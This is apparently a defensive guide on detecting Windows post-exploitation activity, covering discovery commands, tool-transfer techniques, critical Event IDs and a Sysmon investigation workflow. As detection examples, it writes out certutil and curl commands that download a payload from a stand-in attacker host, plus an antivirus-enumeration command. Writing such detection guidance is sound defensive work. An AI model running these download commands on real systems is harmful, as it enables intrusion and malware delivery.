# Windows Threat Detection & Security Monitoring

## Overview
This documentation focuses on detecting common post-exploitation tactics within a Windows environment, specifically targeting discovery, tool transfer, and persistence. By leveraging Windows Event Logs and Sysmon, we can identify "Living off the Land" techniques used by adversaries.

## 1. Discovery Process Detection
Once an attacker gains access, they typically execute discovery commands to understand the host's purpose, user privileges, and network position.

### High-Alert Discovery Commands
| Discovery Goal | Typical Command | Detection Focus |
| :--- | :--- | :--- |
| **Users & Groups** | `whoami`, `net user`, `net localgroup` | Identification of current privileges and local admins. |
| **Network Settings** | `ipconfig /all`, `netstat -ano`, `arp -a` | Identifying lateral movement targets and active connections. |
| **System & Apps** | `systeminfo`, `tasklist /v`, `wmic product get name` | Finding vulnerabilities or installed security software. |
| **Active Antivirus** | `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *` | Determining if security software is active to avoid detection. |

## 2. Detecting Ingress Tool Transfer
Attackers often download malicious payloads using built-in Windows utilities to bypass basic security filters.

### Common Tool Transfer Methods
* **Certutil**: `certutil.exe -urlcache -f https://attacker.com/payload.exe payload.exe`.
* **Curl**: `curl.exe https://attacker.com/payload.exe -o payload.exe` (Windows 10+).
* **PowerShell (IWR)**: `powershell -c "Invoke-WebRequest -Uri 'URL' -OutFile 'File'"`.

### Detection Strategy
* **Network Connections**: Monitor for the above processes initiating outbound connections to external IP addresses.
* **Sysmon Event ID 11**: Monitor for file creation events originating from `certutil.exe` or `powershell.exe` in temporary directories.

## 3. Critical Windows Event IDs
A robust SOC monitoring strategy focuses on specific Event IDs that correlate with malicious behavior.

| Source | Event ID | Description |
| :--- | :--- | :--- |
| **Security** | `4624` / `4625` | Successful / Failed Logon attempts (Brute force detection). |
| **Security** | `4688` | New Process Creation (Requires Command-Line Auditing). |
| **Security** | `4698` | A Scheduled Task was created (Persistence detection). |
| **Sysmon** | `1` | Process Creation with Parent-Child relationships. |
| **Sysmon** | `3` | Network Connection initiated by a process. |
| **Sysmon** | `22` | DNS Query (Useful for identifying C2 domains). |

## 4. Investigative Workflow: Sysmon & SIEM
When investigating a suspicious alert, follow the event chain to understand the scope of the compromise.

1. **Identify the Source**: Which process made the initial connection or DNS request?.
2. **Analyze the Command Line**: Was an obfuscated PowerShell command or a known tool transfer utility used?.
3. **Verify the File**: Check the hash of any files created (Event ID 11) against threat intelligence sources.
4. **Hunt for Persistence**: Check if the suspicious process created any scheduled tasks or registry keys to survive reboot.

## 5. Summary of Defensive Controls
* **Enable Command-Line Logging**: Ensure Event ID 4688 includes process command-line arguments via Group Policy.
* **Deploy Sysmon**: Use a refined configuration (like SwiftOnSecurity) to reduce noise while maintaining visibility on critical events.
* **Zero Trust Logging**: Assume built-in tools like `certutil` are compromised and monitor their usage patterns globally.